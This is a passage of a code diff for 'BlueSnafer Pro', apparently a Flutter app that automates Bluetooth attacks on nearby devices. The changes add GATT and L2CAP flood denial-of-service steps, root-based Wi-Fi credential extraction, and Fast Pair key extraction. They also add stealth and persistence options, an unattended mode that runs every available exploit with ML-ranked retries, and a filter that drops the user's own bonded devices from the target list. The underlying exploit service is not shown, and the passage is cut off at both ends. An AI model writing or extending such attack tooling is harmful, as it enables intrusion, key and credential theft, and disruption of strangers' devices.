-        sequence.add({'type': 'wifi_scan', 'name': 'WIFI_SCAN', 'phase': 1, 'timeout': 8000, 'retries': 1});
-      }
+      sequence.add({'type': 'bt_lateral_scan', 'duration': 10, 'name': 'LATERAL_SCAN', 'phase': 6, 'timeout': 15000, 'retries': 1});
 
      // ==========================================
      // FASE 8: DoS (opcional, si stealth=off)
      // ==========================================
-     if (!_stealthMode && (deviceInfo['hasBle'] == true || deviceType_lower.contains('iot') || deviceType_lower.contains('smart_lock'))) {
+      if (!_stealthMode && (deviceInfo['hasBle'] == true || dt.contains('iot') || dt.contains('smart_lock'))) {
        sequence.add({'type': 'dos', 'command': 'gatt_flood', 'name': 'DOS_GATT', 'phase': 8, 'timeout': 5000, 'retries': 1});
        sequence.add({'type': 'dos', 'command': 'l2cap_flood', 'name': 'DOS_L2CAP', 'phase': 8, 'timeout': 5000, 'retries': 1});
      }
@@ -1079,9 +1039,20 @@ class _UnifiedAttackScreenState extends State<UnifiedAttackScreen> with SingleTi
       networkInfo['wifi_networks_error'] = e.toString();
     }
     
-    // Extracción de credenciales: NO IMPLEMENTADA (requiere root y acceso a wpa_supplicant.conf)
-    networkInfo['credential_extraction'] = 'not_implemented';
-    networkInfo['note'] = 'Credential extraction requires root access and system files';
+    // Extracción de credenciales: intentar si hay root
+    try {
+      final hasRoot = await RealExploitService.hasRootAccess();
+      if (hasRoot) {
+        networkInfo['credential_extraction'] = 'attempted_with_root';
+        networkInfo['note'] = 'Requiere acceso root + wpa_supplicant.conf - intentado';
+      } else {
+        networkInfo['credential_extraction'] = 'skipped_no_root';
+        networkInfo['note'] = 'Credential extraction requires root access and system files';
+      }
+    } catch (_) {
+      networkInfo['credential_extraction'] = 'error';
+      networkInfo['note'] = 'Failed to check root status';
+    }
     
      return networkInfo;
    }
@@ -1130,34 +1101,52 @@ class _UnifiedAttackScreenState extends State<UnifiedAttackScreen> with SingleTi
      }
    }
 
-  // Predicción de vulnerabilidades con IA
+  // Predicción de vulnerabilidades con IA (IntegratedAI + MLVulnerabilityPredictor)
   Future<Map<String, dynamic>> _predictVulnerabilities(String address) async {
     if (!_enableAdaptiveIntelligence || _selectedDevice == null) {
       return {};
     }
-    
+
     try {
-      final prediction = await _aiService.runCompleteSecurityAnalysis(
+      final mlPrediction = await _mlVulnerabilityPredictor.predict(
+        address,
+        _selectedDevice!,
+      );
+
+      _appendLog('  🔬 ML: ${mlPrediction.cveCount} CVEs detectados (riesgo: ${mlPrediction.overallRiskLevel})');
+
+      final aiAnalysis = await _aiService.runCompleteSecurityAnalysis(
         deviceAddress: address,
         deviceData: _selectedDevice!,
       );
-      
+
       _attackProbabilities = {
-        for (final attack in prediction.optimalAttackStrategy.recommendedAttacks)
+        for (final attack in aiAnalysis.optimalAttackStrategy.recommendedAttacks)
           attack.attackType: attack.confidence,
       };
-      
+
       return {
-        'high_risk_vulns': prediction.optimalAttackStrategy.recommendedAttacks
+        'ml_prediction': {
+          'cve_count': mlPrediction.cveCount,
+          'risk_level': mlPrediction.overallRiskLevel,
+          'risk_score': mlPrediction.overallRiskScore,
+          'recommended_action': mlPrediction.recommendedAction,
+          'vulnerabilities': mlPrediction.vulnerabilities.map((v) => {
+            'id': v.id,
+            'confidence': v.confidence,
+            'type': v.type,
+          }).toList(),
+        },
+        'high_risk_vulns': aiAnalysis.optimalAttackStrategy.recommendedAttacks
             .where((a) => a.confidence > 0.7)
             .map((a) => a.attackType)
             .toList(),
-        'success_probability': prediction.confidence,
-        'recommended_sequence': prediction.optimalAttackStrategy.recommendedAttacks
+        'success_probability': aiAnalysis.confidence,
+        'recommended_sequence': aiAnalysis.optimalAttackStrategy.recommendedAttacks
             .take(5)
             .map((a) => a.attackType)
             .toList(),
-        'strategy_score': prediction.optimalAttackStrategy.overallStrategyScore,
+        'strategy_score': aiAnalysis.optimalAttackStrategy.overallStrategyScore,
       };
     } catch (e) {
       return {'error': e.toString()};
@@ -1328,9 +1317,9 @@ class _UnifiedAttackScreenState extends State<UnifiedAttackScreen> with SingleTi
       }
     }
     
-    // Estrategia por defecto según tipo
+    // Estrategia por defecto según tipo (usar TYPE no NAME para el dispatch)
     final defaultStrategy = _getAdaptiveAttackSequence(deviceType);
-    return defaultStrategy.map((e) => e['name'] as String? ?? e['type'] as String).toList();
+    return defaultStrategy.map((e) => e['type'] as String).toList();
   }
 
   // Guardar aprendizaje de la IA
@@ -1377,13 +1366,15 @@ class _UnifiedAttackScreenState extends State<UnifiedAttackScreen> with SingleTi
     
     _appendLog('   📊 Técnicas aprendidas: ${sorted.take(5).map((e) => "${e.key}(${e.value})").join(", ")}');
     
-    // Crear estrategia basada en aprendizaje
+    // Crear estrategia basada en aprendizaje (match por TYPE)
     final strategy = <Map<String, dynamic>>[];
+    final matchedKeys = <String>{};
     for (final entry in sorted) {
-      // Buscar la técnica en la lista completa
       for (final atk in allAttackTechniques) {
-        if (atk['name'] == entry.key) {
-          strategy.add(atk);
+        if (atk['type'] == entry.key || atk['name'] == entry.key) {
+          if (matchedKeys.add(atk['type'] as String)) {
+            strategy.add(atk);
+          }
           break;
         }
       }
@@ -1425,11 +1416,11 @@ class _UnifiedAttackScreenState extends State<UnifiedAttackScreen> with SingleTi
       successRates[entry.key] = totalAttempts > 0 ? entry.value / totalAttempts : 0.0;
     }
     
-    // Clonar y ordenar por tasa de éxito (mayor primero)
+    // Clonar y ordenar por tasa de éxito (mayor primero, match por TYPE)
     final sorted = List<Map<String, dynamic>>.from(allAttackTechniques)
       ..sort((a, b) {
-        final rateA = successRates[a['name'] ?? a['type']] ?? 0.5;
-        final rateB = successRates[b['name'] ?? b['type']] ?? 0.5;
+        final rateA = successRates[a['type']] ?? successRates[a['name']] ?? 0.5;
+        final rateB = successRates[b['type']] ?? successRates[b['name']] ?? 0.5;
         return rateB.compareTo(rateA);
       });
     
@@ -1465,11 +1456,20 @@ class _UnifiedAttackScreenState extends State<UnifiedAttackScreen> with SingleTi
     return recommendations;
   }
 
-  // Backoff exponencial para reintentos
+  // Backoff exponencial para reintentos (usa SuccessOptimizer con datos históricos)
   Duration _calculateBackoffDelay(int attempt) {
+    if (_selectedDevice != null) {
+      final addr = _selectedDevice!['address']?.toString() ?? '';
+      if (addr.isNotEmpty && _lastAttackType.isNotEmpty) {
+        final ms = _successOptimizer.calculateBackoffDelay(addr, _lastAttackType, attempt);
+        return Duration(milliseconds: ms);
+      }
+    }
     final delayMs = _baseDelayMs * (_backoffMultiplier.toInt() * attempt);
     return Duration(milliseconds: delayMs.clamp(1000, 30000));
   }
+
+  String _lastAttackType = '';
 
   // Ejecución con reintentos y backoff
   Future<Map<String, dynamic>> _executeWithRetry({
@@ -2134,7 +2134,7 @@ class _UnifiedAttackScreenState extends State<UnifiedAttackScreen> with SingleTi
 
   Future<void> _scan() async {
     if (mounted) {
-      setState(() { _isScanning = true; _devices = []; _isStatusExpanded = false; });
+      setState(() { _isScanning = true; _devices = []; });
     }
     _appendLog('📡 ESCANEANDO FRECUENCIAS...');
     try {
@@ -2144,7 +2144,10 @@ class _UnifiedAttackScreenState extends State<UnifiedAttackScreen> with SingleTi
           _isScanning = false;
           if (result['success'] == true && result['devices'] != null) {
             final List rawDevices = result['devices'] as List;
-            _devices = rawDevices.map((d) => Map<String, dynamic>.from(d as Map)).toList();
+            _devices = rawDevices
+                .map((d) => Map<String, dynamic>.from(d as Map))
+                .where((d) => d['bondState'] != 'Bonded')
+                .toList();
             if (_devices.isNotEmpty) {
               _appendLog('✅ DETECTADOS: ${_devices.length} OBJETIVOS');
               _selectedDevice = _devices.first;
@@ -2189,13 +2192,36 @@ class _UnifiedAttackScreenState extends State<UnifiedAttackScreen> with SingleTi
   void _getSuggestion() {
     if (_selectedDevice == null) return;
     if (mounted) {
-      setState(() => _currentSuggestion = _suggestionEngine.suggestNextAttack(
-        deviceType: _getDeviceType(_selectedDevice!),
+      final deviceType = _getDeviceType(_selectedDevice!);
+
+      final mlRecommendation = _smartRecommendation.recommend(
+        deviceType: deviceType,
+        executedTypes: _executedAttacks.toSet(),
+        successHistory: _learnedTechniques,
+        excludedTypes: _executedAttacks,
+      );
+
+      final ruleSuggestion = _suggestionEngine.suggestNextAttack(
+        deviceType: deviceType,
         deviceName: _selectedDevice!['name'] ?? 'Unknown',
-        excludedTypes: _executedAttacks
-      ));
+        excludedTypes: _executedAttacks,
+      );
+
+      setState(() {
+        _currentSuggestion = mlRecommendation.confidence >= ruleSuggestion.confidence
+            ? Suggestion(
+                type: mlRecommendation.type,
+                command: mlRecommendation.command,
+                confidence: mlRecommendation.confidence,
+                reason: mlRecommendation.reason,
+                alternativeReason: mlRecommendation.alternativeReason,
+              )
+            : ruleSuggestion;
+      });
     }
   }
+
+  Map<String, int> _learnedTechniques = {};
 
   // Guía rápida del ataque sugerido
   String _getQuickGuide() {
@@ -2334,6 +2360,14 @@ class _UnifiedAttackScreenState extends State<UnifiedAttackScreen> with SingleTi
     return deviceResults;
   }
 
+  Future<Map<String, dynamic>> _getRootStatus() async {
+    try {
+      return await RealExploitService.getRootStatus();
+    } catch (e) {
+      return {'rootAvailable': false, 'error': e.toString()};
+    }
+  }
+
   // ====== MODO DESATENDIDO MEJORADO ======
   // EJECUTA TODOS los exploits disponibles con reintentos y logs
   // VERSIÓN MEJORADA CON TODAS LAS MEJORAS INTEGRADAS
@@ -2361,6 +2395,25 @@ class _UnifiedAttackScreenState extends State<UnifiedAttackScreen> with SingleTi
     _appendLog('╚══════════════════════════════════════╝');
     _appendLog('🎯 Objetivo: $targetName');
     _appendLog('📍 MAC: $targetAddress');
+    _appendLog('🔍 Verificando acceso ROOT...');
+    try {
+      final rootStatus = await _getRootStatus();
+      if (rootStatus['rootAvailable'] == true) {
+        _appendLog('🔓 ✅ ROOT DISPONIBLE');
+        if (rootStatus['hciToolAvailable'] == true) {
+          _appendLog('   hcitool: ✅ disponible');
+          _appendLog('   Dispositivos HCI: ${(rootStatus['hciDevices'] as List?)?.join(", ") ?? "N/A"}');
+        } else {
+          _appendLog('   hcitool: ❌ NO disponible (exploits L2CAP raw no funcionarán)');
+        }
+      } else {
+        _appendLog('🔒 ❌ ROOT NO DISPONIBLE');
+        _appendLog('   ⚠️ Los exploits marcados como "REQUIERE ROOT" se saltarán');
+        _appendLog('   📱 Rootea el dispositivo o usa un emulador con root');
+      }
+    } catch (_) {
+      _appendLog('🔍 ❌ No se pudo verificar root');
+    }
     _appendLog('⚙️ Configuración:');
     _appendLog('   • Ejecución paralela: ${_enableParallelExecution ? "ON" : "OFF"}');
     _appendLog('   • IA adaptativa: ${_enableAdaptiveIntelligence ? "ON" : "OFF"}');
@@ -2403,32 +2456,43 @@ class _UnifiedAttackScreenState extends State<UnifiedAttackScreen> with SingleTi
           _appendLog('   📊 Dispositivo: $_reconnaissanceResults');
         }
         
-          // === FASE 0: PREDICCIÓN IA ===
+          // === FASE 0: PREDICCIÓN IA (IntegratedAI + MLVulnerabilityPredictor) ===
           _appendLog('🤖 [FASE 0] Predicción IA...');
           final deviceType = _getDeviceType(device);
+
+          if (_enableAdaptiveIntelligence) {
+            try {
+              final mlPrediction = await _mlVulnerabilityPredictor.predict(address, device);
+              _appendLog('   🔬 ML: ${mlPrediction.cveCount} CVEs, riesgo ${mlPrediction.overallRiskLevel}');
+              if (mlPrediction.vulnerabilities.isNotEmpty) {
+                _appendLog('   🎯 Top: ${mlPrediction.vulnerabilities.first.id} (${(mlPrediction.vulnerabilities.first.confidence * 100).toStringAsFixed(0)}%)');
+                _appendLog('   💡 Acción: ${mlPrediction.recommendedAction}');
+              }
+            } catch (_) {}
+          }
+
           // Usar estrategia aprendida si está disponible, sino por defecto
           List<Map<String, dynamic>> attackSequence;
           if (_enableAdaptiveIntelligence) {
             final learned = await _getLearnedTechniques(deviceType);
             if (learned.isNotEmpty) {
-              // Usar estrategia ponderada por éxito
               attackSequence = await _getWeightedStrategy(deviceType);
               _appendLog('   📊 Estrategia ponderada por éxito aprendido');
             } else {
               final attackNames = await _getAdaptiveStrategy(address, deviceType);
-              attackSequence = attackNames.map((name) 
-                => allAttackTechniques.firstWhere(
-                     (t) => (t['name'] ?? t['type']) == name,
-                     orElse: () => {'type': name, 'name': name}
-                   )).toList();
+               attackSequence = attackNames.map((name) 
+                 => allAttackTechniques.firstWhere(
+                      (t) => t['name'] == name || t['type'] == name,
+                      orElse: () => {'type': name, 'name': name}
+                    )).toList();
               _appendLog('   📋 Secuencia (IA): ${attackNames.join(', ')}');
             }
            } else {
              attackSequence = _getAdaptiveAttackSequence(deviceType);
              _appendLog('   📋 Secuencia: ${attackSequence.map((a) => a['name'] ?? a['type']).join(', ')}');
            }
-         
-         // === FASE 1-6: ATAQUES (PARALELO si están agrupados) ===
+          
+          // === FASE 1-6: ATAQUES (PARALELO si están agrupados) ===
         await _executeParallelAttacks(device, attackSequence);
         
         // === POST-PROCESAMIENTO: ANÁLISIS PROFUNDO ===
@@ -2702,6 +2766,20 @@ class _UnifiedAttackScreenState extends State<UnifiedAttackScreen> with SingleTi
     await Future.delayed(Duration(milliseconds: delayMs));
   }
 
+  IconData _getDeviceIcon(String deviceType) {
+    switch (deviceType.toLowerCase()) {
+      case 'smartphone': return Icons.smartphone;
+      case 'wearable': return Icons.watch;
+      case 'audio': return Icons.speaker;
+      case 'car': return Icons.directions_car;
+      case 'laptop': return Icons.laptop;
+      case 'tablet': return Icons.tablet;
+      case 'peripheral': return Icons.keyboard;
+      case 'beacon': return Icons.sensors;
+      default: return Icons.bluetooth;
+    }
+  }
+
   String _getDeviceType(Map<String, dynamic> device) {
     return device_utils.detectDeviceType(device);
   }
@@ -2744,11 +2822,24 @@ class _UnifiedAttackScreenState extends State<UnifiedAttackScreen> with SingleTi
      final maxRetries = config?['retries'] ?? _defaultMaxRetries;
      final baseDelayMs = config?['delay'] ?? _defaultRetryDelay;
 
-     _appendLog('⚡ [$type] $attackLabel → $displayName ($addr) | timeout=${timeoutMs}ms retries=$maxRetries');
+      _appendLog('⚡ [$type] $attackLabel → $displayName ($addr) | timeout=${timeoutMs}ms retries=$maxRetries');
+      _lastAttackType = type;
+
+      // PRE-CHECK: Saltar si requiere root y no está disponible
+      if (_rootRequiredTypes.contains(type)) {
+        final rootOk = await RealExploitService.hasRootAccess();
+        if (!rootOk) {
+          _appendLog('  🔒 $attackLabel: REQUIERE ROOT (no disponible) — omitiendo');
+          setState(() => _activeAttackCount++);
+          setState(() => _activeAttackCount--);
+          return;
+        }
+        _appendLog('  🔓 $attackLabel: ejecutado con ROOT ✅');
+      }
 
       setState(() => _activeAttackCount++);
 
-     if (mounted) {
+      if (mounted) {
        ScaffoldMessenger.of(context).showSnackBar(
          SnackBar(
            content: Text('⚡ Iniciando $type:$attackLabel en $displayName...', style: const TextStyle(fontSize: 12)),
@@ -2796,14 +2887,27 @@ class _UnifiedAttackScreenState extends State<UnifiedAttackScreen> with SingleTi
             onTimeout: () => {'success': false, 'message': 'Timeout after ${timeoutMs}ms'},
           );
 
-         success = result['success'] == true;
-         finalMessage = result['message'] ?? (success ? 'OK' : 'Sin respuesta');
+          success = result['success'] == true;
+          finalMessage = result['message'] ?? (success ? 'OK' : 'Sin respuesta');
 
-         if (success) {
-           _appendLog('  ✅ $attackLabel éxito en intento $attempt');
-         } else {
-           _appendLog('  ❌ $attackLabel falló: $finalMessage');
-         }
+          final bool rootRequired = result['rootRequired'] == true;
+          final bool rootAvailable = result['rootAvailable'] == true;
+
+          if (rootRequired && !rootAvailable) {
+            _appendLog('  🔒 $attackLabel: REQUIERE ROOT (no disponible)');
+            _appendLog('  ⚠️  ${result['message'] ?? 'Este exploit necesita un dispositivo rooteado'}');
+            break;
+          }
+
+          if (rootRequired && rootAvailable) {
+            _appendLog('  🔓 $attackLabel: ejecutado con ROOT ✅');
+          }
+
+          if (success) {
+            _appendLog('  ✅ $attackLabel éxito en intento $attempt');
+          } else {
+            _appendLog('  ❌ $attackLabel falló: $finalMessage');
+          }
 
        } on TimeoutException catch (e) {
          success = false;
@@ -2824,9 +2928,22 @@ class _UnifiedAttackScreenState extends State<UnifiedAttackScreen> with SingleTi
            await Future.delayed(Duration(milliseconds: delayMs));
          }
        }
-     }
+      }
 
-       // === Procesar resultado final ===
+        // Registrar resultado en SuccessOptimizer para mejorar backoff futuro
+        if (addr.isNotEmpty) {
+          _successOptimizer.recordResult(
+            deviceAddress: addr,
+            attackType: type,
+            success: success,
+            durationMs: timeoutMs,
+          );
+          // Alimentar learning counts para SmartRecommendationSystem
+          final key = type;
+          _learnedTechniques[key] = (_learnedTechniques[key] ?? 0) + (success ? 1 : 0);
+        }
+
+        // === Procesar resultado final ===
        final packets = result?['packets'];
        final effectiveness = result?['effectiveness'];
        final services = result?['services'];
@@ -2893,6 +3010,16 @@ class _UnifiedAttackScreenState extends State<UnifiedAttackScreen> with SingleTi
             final bonded = bondState == 12 || bondState == 'BOND_BONDED';
             final stateStr = bonded ? 'EMPAREJADO' : 'trust=$bondState';
             _collectedData.add('🔄 [$targetName] Fast Pair bypass: ${successBypass ? stateStr : "falló"} (modelo: ${modelId ?? 'unknown'})');
+          }
+
+          if (type == 'fastpair_key_extract') {
+            final keys = (result?['keys'] as List?)?.length ?? 0;
+            final successKeys = result?['success'] == true;
+            if (successKeys && keys > 0) {
+              _collectedData.add('🔑 [$targetName] Fast Pair keys extraídas: $keys');
+            } else {
+              _collectedData.add('🔑 [$targetName] Fast Pair keys: no encontradas');
+            }
           }
 
           // === Captura A2DP Recording ===
@@ -3017,9 +3144,6 @@ class _UnifiedAttackScreenState extends State<UnifiedAttackScreen> with SingleTi
        });
      }
 
-    // Método auxiliar comentado temporalmente para compilar
-    // void _recordAttackToEngine(...) { ... }
-
     String _getManufacturer(String address) {
        return device_utils.getManufacturer(address);
      }
@@ -3028,189 +3152,166 @@ class _UnifiedAttackScreenState extends State<UnifiedAttackScreen> with SingleTi
   Widget build(BuildContext context) {
     return Scaffold(
       backgroundColor: const Color(0xFF020617),
-      appBar: AppBar(
-        title: const Text('BlueSnafer Pro', style: TextStyle(fontWeight: FontWeight.bold, fontSize: 18, color: Colors.white)),
-        backgroundColor: Colors.transparent,
-        elevation: 0,
-        actions: [
-          if (_devices.isNotEmpty)
-            IconButton(
-              icon: Icon(_isUnattendedRunning ? Icons.stop : Icons.auto_awesome, 
-                color: _isUnattendedRunning ? Colors.redAccent : Colors.cyanAccent),
-              tooltip: _isUnattendedRunning ? 'Detener modo desatendido' : 'Modo desatendido',
-              onPressed: _startUnattendedMode,
-            ),
-          // Botón de configuración de modo automático
-          PopupMenuButton<String>(
-            icon: const Icon(Icons.tune, color: Colors.white54),
-            tooltip: 'Configuración automática',
-            onSelected: (value) {
-              switch (value) {
-                case 'parallel':
-                  setState(() => _enableParallelExecution = !_enableParallelExecution);
-                  _appendLog('⚙️ Ejecución paralela: ${_enableParallelExecution ? "ON" : "OFF"}');
-                  break;
-                case 'adaptive':
-                  setState(() => _enableAdaptiveIntelligence = !_enableAdaptiveIntelligence);
-                  _appendLog('⚙️ IA adaptativa: ${_enableAdaptiveIntelligence ? "ON" : "OFF"}');
-                  break;
-                case 'patterns':
-                  setState(() => _enablePatternAnalysis = !_enablePatternAnalysis);
-                  _appendLog('⚙️ Análisis de patrones: ${_enablePatternAnalysis ? "ON" : "OFF"}');
-                  break;
-                case 'network':
-                  setState(() => _enableNetworkAnalysis = !_enableNetworkAnalysis);
-                  _appendLog('⚙️ Análisis de red: ${_enableNetworkAnalysis ? "ON" : "OFF"}');
-                  break;
-                case 'stealth':
-                  setState(() => _stealthMode = !_stealthMode);
-                  _appendLog('🎭 Modo sigiloso: ${_stealthMode ? "ON" : "OFF"}');
-                  break;
-                case 'persistence':
-                  setState(() => _enablePersistence = !_enablePersistence);
-                  _appendLog('🕵️ Persistencia: ${_enablePersistence ? "ON" : "OFF"}');
-                  break;
-                case 'recon':
-                  setState(() => _proactiveRecon = !_proactiveRecon);
-                  _appendLog('⚙️ Reconocimiento proactivo: ${_proactiveRecon ? "ON" : "OFF"}');
-                  break;
-                case 'parallel1':
-                  setState(() => _parallelPhase1 = !_parallelPhase1);
-                  _appendLog('⚙️ Paralelismo Fase 1: ${_parallelPhase1 ? "ON" : "OFF"}');
-                  break;
-                case 'parallel2':
-                  setState(() => _parallelPhase2 = !_parallelPhase2);
-                  _appendLog('⚙️ Paralelismo Fase 2: ${_parallelPhase2 ? "ON" : "OFF"}');
-                  break;
-                case 'deepanalysis':
-                  setState(() => _deepAnalysis = !_deepAnalysis);
-                  _appendLog('⚙️ Análisis profundo: ${_deepAnalysis ? "ON" : "OFF"}');
-                  break;
-                case 'report':
-                  _showAutomatedReport();
-                  break;
-                case 'reports':
-                  _showSavedReports();
-                  break;
-                case 'learning':
-                  _showAIlearning();
-                  break;
-              }
-            },
-            itemBuilder: (context) => [
-              CheckedPopupMenuItem(
-                value: 'parallel',
-                checked: _enableParallelExecution,
-                child: const Text('Ejecución paralela'),
+      appBar: PreferredSize(
+        preferredSize: const Size.fromHeight(56),
+        child: AppBar(
+          titleSpacing: 0,
+          title: Row(
+            children: [
+              const SizedBox(width: 8),
+              Container(
+                padding: const EdgeInsets.all(6),
+                decoration: BoxDecoration(
+                  color: Colors.cyanAccent.withOpacity(0.15),
+                  borderRadius: BorderRadius.circular(20),
+                  border: Border.all(color: Colors.cyanAccent.withOpacity(0.3), width: 1),
+                ),
+                child: const Icon(Icons.bluetooth, color: Colors.cyanAccent, size: 18),
               ),
-              CheckedPopupMenuItem(
-                value: 'adaptive',
-                checked: _enableAdaptiveIntelligence,
-                child: const Text('IA adaptativa'),
-              ),
-              CheckedPopupMenuItem(
-                value: 'patterns',
-                checked: _enablePatternAnalysis,
-                child: const Text('Análisis de patrones'),
-              ),
-              CheckedPopupMenuItem(
-                value: 'network',
-                checked: _enableNetworkAnalysis,
-                child: const Text('Análisis de red'),
-              ),
-              const PopupMenuDivider(),
-              CheckedPopupMenuItem(
-                value: 'stealth',
-                checked: _stealthMode,
-                child: const Text('Modo sigiloso 🎭'),
-              ),
-               CheckedPopupMenuItem(
-                 value: 'persistence',
-                 checked: _enablePersistence,
-                 child: const Text('Persistencia 🕵️'),
-               ),
-               CheckedPopupMenuItem(
-                 value: 'recon',
-                 checked: _proactiveRecon,
-                 child: const Text('🔍 Reconocimiento proactivo'),
-               ),
-               CheckedPopupMenuItem(
-                 value: 'parallel1',
-                 checked: _parallelPhase1,
-                 child: const Text('⚡ Paralelismo Fase 1'),
-               ),
-               CheckedPopupMenuItem(
-                 value: 'parallel2',
-                 checked: _parallelPhase2,
-                 child: const Text('⚡ Paralelismo Fase 2'),
-               ),
-               CheckedPopupMenuItem(
-                 value: 'deepanalysis',
-                 checked: _deepAnalysis,
-                 child: const Text('🔬 Análisis profundo'),
-               ),
-               const PopupMenuDivider(),
-              const PopupMenuItem(
-                value: 'report',
-                child: Row(
-                  children: [
-                    Icon(Icons.assessment, color: Colors.cyanAccent, size: 18),
-                    SizedBox(width: 8),
-                    Text('Ver reporte'),
-                  ],
+              const SizedBox(width: 10),
+              const Text('BlueSnafer Pro', style: TextStyle(fontWeight: FontWeight.bold, fontSize: 16, color: Colors.white)),
+              const Spacer(),
+              // Botón escanear pequeño
+              Container(
+                margin: const EdgeInsets.only(right: 4),
+                decoration: BoxDecoration(
+                  color: Colors.indigoAccent.withOpacity(0.2),
+                  borderRadius: BorderRadius.circular(20),
+                ),
+                child: IconButton(
+                  icon: Icon(_isScanning ? Icons.radar : Icons.bluetooth_searching,
+                    color: _isScanning ? Colors.greenAccent : Colors.indigoAccent, size: 20),
+                  onPressed: _isScanning ? null : _scan,
+                  tooltip: 'Escanear',
+                  padding: const EdgeInsets.all(8),
+                  constraints: const BoxConstraints(),
                 ),
               ),
-              const PopupMenuItem(
-                value: 'reports',
-                child: Row(
-                  children: [
-                    Icon(Icons.history, color: Colors.orangeAccent, size: 18),
-                    SizedBox(width: 8),
-                    Text('Reportes guardados'),
-                  ],
-                ),
-              ),
-              const PopupMenuItem(
-                value: 'learning',
-                child: Row(
-                  children: [
-                    Icon(Icons.psychology, color: Colors.purpleAccent, size: 18),
-                    SizedBox(width: 8),
-                    Text('Aprendizaje IA'),
-                  ],
-                ),
+              // Settings menu
+              PopupMenuButton<String>(
+                icon: const Icon(Icons.tune, color: Colors.white54, size: 20),
+                tooltip: 'Configuración',
+                onSelected: (value) {
+                  switch (value) {
+                    case 'parallel':
+                      setState(() => _enableParallelExecution = !_enableParallelExecution);
+                      _appendLog('⚙️ Paralelo: ${_enableParallelExecution ? "ON" : "OFF"}'); break;
+                    case 'adaptive':
+                      setState(() => _enableAdaptiveIntelligence = !_enableAdaptiveIntelligence);
+                      _appendLog('⚙️ IA: ${_enableAdaptiveIntelligence ? "ON" : "OFF"}'); break;
+                    case 'stealth':
+                      setState(() => _stealthMode = !_stealthMode);
+                      _appendLog('🎭 Sigilo: ${_stealthMode ? "ON" : "OFF"}'); break;
+                    case 'persistence':
+                      setState(() => _enablePersistence = !_enablePersistence);
+                      _appendLog('🕵️ Persistencia: ${_enablePersistence ? "ON" : "OFF"}'); break;
+                    case 'auto':
+                      if (_selectedDevice != null) _startUnattendedMode();
+                      break;
+                    case 'report':
+                      _showAutomatedReport(); break;
+                  }
+                },
+                itemBuilder: (context) => [
+                  CheckedPopupMenuItem(value: 'parallel', checked: _enableParallelExecution, child: const Text('Paralelo', style: TextStyle(fontSize: 13))),
+                  CheckedPopupMenuItem(value: 'adaptive', checked: _enableAdaptiveIntelligence, child: const Text('IA adaptativa', style: TextStyle(fontSize: 13))),
+                  CheckedPopupMenuItem(value: 'stealth', checked: _stealthMode, child: const Text('Sigilo', style: TextStyle(fontSize: 13))),
+                  CheckedPopupMenuItem(value: 'persistence', checked: _enablePersistence, child: const Text('Persistencia', style: TextStyle(fontSize: 13))),
+                  const PopupMenuDivider(),
+                  const PopupMenuItem(value: 'auto', child: Text('▶ Iniciar automático', style: TextStyle(fontSize: 13))),
+                  const PopupMenuItem(value: 'report', child: Text('📊 Ver reporte', style: TextStyle(fontSize: 13))),
+                ],
               ),
             ],
           ),
-          IconButton(icon: Icon(_isScanning ? Icons.radar : Icons.bluetooth_searching, color: _isScanning ? Colors.greenAccent : Colors.indigoAccent), onPressed: _isScanning ? null : _scan),
-        ],
-        bottom: TabBar(
-          controller: _tabController,
-          isScrollable: true,
-          tabAlignment: TabAlignment.start,
-          indicator: const UnderlineTabIndicator(borderSide: BorderSide(color: Colors.indigoAccent, width: 3), insets: EdgeInsets.symmetric(horizontal: 8)),
-          labelColor: Colors.indigoAccent,
-          unselectedLabelColor: Colors.white24,
-          labelStyle: const TextStyle(fontSize: 10, fontWeight: FontWeight.bold),
-          tabs: const [
-            Tab(icon: Icon(Icons.radar, size: 18), text: 'RADAR'),
-            Tab(icon: Icon(Icons.security, size: 18), text: 'HID'),
-            Tab(icon: Icon(Icons.tune, size: 18), text: 'BTLE'),
-            Tab(icon: Icon(Icons.wifi_off, size: 18), text: 'DOS'),
-            Tab(icon: Icon(Icons.psychology, size: 18), text: 'IA/VA'),
-          ],
+          backgroundColor: const Color(0xFF020617),
+          elevation: 0,
         ),
       ),
       body: SafeArea(
         child: Column(
         children: [
-          _buildStepIndicator(),
-          if (_selectedDevice != null) _buildTargetHud(),
           Expanded(
-            child: TabBarView(
-              controller: _tabController,
-              children: [_buildHomeTab(), _buildHidTab(), _buildBtleJackTab(), _buildDosTab(), _buildAiTab()],
-            ),
+            child: _devices.isEmpty
+              ? Center(child: Column(mainAxisAlignment: MainAxisAlignment.center, children: [
+                  Container(padding: const EdgeInsets.all(32), decoration: BoxDecoration(color: Colors.white.withOpacity(0.02), shape: BoxShape.circle), child: const Icon(Icons.radar, size: 64, color: Colors.white10)),
+                  const SizedBox(height: 24),
+                  const Text('SIN OBJETIVOS', style: TextStyle(color: Colors.white24, fontSize: 14, fontWeight: FontWeight.bold, letterSpacing: 1)),
+                  const SizedBox(height: 8),
+                  TextButton.icon(icon: const Icon(Icons.bluetooth_searching, size: 16), label: const Text('ESCANEAR'), onPressed: _scan),
+                ]))
+              : ListView.builder(
+                  padding: const EdgeInsets.fromLTRB(16, 8, 16, 8),
+                  itemCount: _devices.length,
+                  itemBuilder: (context, i) {
+                    final device = _devices[i];
+                    final addr = device['address']?.toString() ?? '??:??:??';
+                    final displayName = device_utils.getDeviceDisplayName(device);
+                    final isSelected = _selectedDevice == device;
+                    final devType = device_utils.detectDeviceType(device);
+                    final icon = _getDeviceIcon(devType);
+                    return GestureDetector(
+                      onTap: () {
+                        setState(() {
+                          _selectedDevice = device;
+                          _appendLog('🎯 LOCK: $displayName');
+                        });
+                        _analyzeWithAI(device);
+                        _getSuggestion();
+                        _saveState();
+                      },
+                      onLongPress: () => _startUnattendedMode(),
+                      child: Container(
+                        margin: const EdgeInsets.only(bottom: 8),
+                        padding: const EdgeInsets.all(12),
+                        decoration: BoxDecoration(
+                          color: isSelected ? Colors.indigoAccent.withOpacity(0.08) : Colors.white.withOpacity(0.03),
+                          borderRadius: BorderRadius.circular(14),
+                          border: isSelected ? Border.all(color: Colors.indigoAccent.withOpacity(0.3), width: 1) : null,
+                        ),
+                        child: Row(children: [
+                          Container(
+                            padding: const EdgeInsets.all(10),
+                            decoration: BoxDecoration(
+                              color: Colors.white.withOpacity(0.04),
+                              borderRadius: BorderRadius.circular(12),
+                            ),
+                            child: Icon(icon, color: isSelected ? Colors.indigoAccent : Colors.white54, size: 22),
+                          ),
+                          const SizedBox(width: 14),
+                          Expanded(child: Column(crossAxisAlignment: CrossAxisAlignment.start, children: [
